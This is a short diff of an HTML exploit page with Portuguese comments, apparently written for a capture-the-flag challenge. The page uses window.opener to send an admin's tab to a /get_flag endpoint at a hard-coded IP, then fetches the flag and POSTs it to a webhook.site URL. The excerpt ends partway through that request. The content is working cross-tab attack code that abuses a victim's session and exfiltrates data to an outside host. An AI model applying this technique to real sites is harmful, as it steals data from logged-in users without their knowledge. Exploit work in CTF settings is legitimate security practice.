@@ -7,14 +7,15 @@
     <h1>Sending the flag...</h1>
     <script>
       if (window.opener) {
-        // Redireciona a aba original com o cookie de admin
+        // Redireciona a aba principal (com cookie de admin) para /get_flag
         window.opener.location = "http://34.134.162.213:17001/get_flag";
 
-        // Depois, pega a flag também nesta aba e exfiltra via webhook
+        // Após 1.5 segundos, esta aba também tenta pegar a flag
         setTimeout(() => {
           fetch("http://34.134.162.213:17001/get_flag")
-            .then(r => r.text())
+            .then(response => response.text())
             .then(flag => {
+              // Envia a flag para seu webhook
               fetch("https://webhook.site/f0455fd0-b8ef-49b3-ba00-a015762e26ad", {
                 method: "POST",
                 mode: "no-cors",
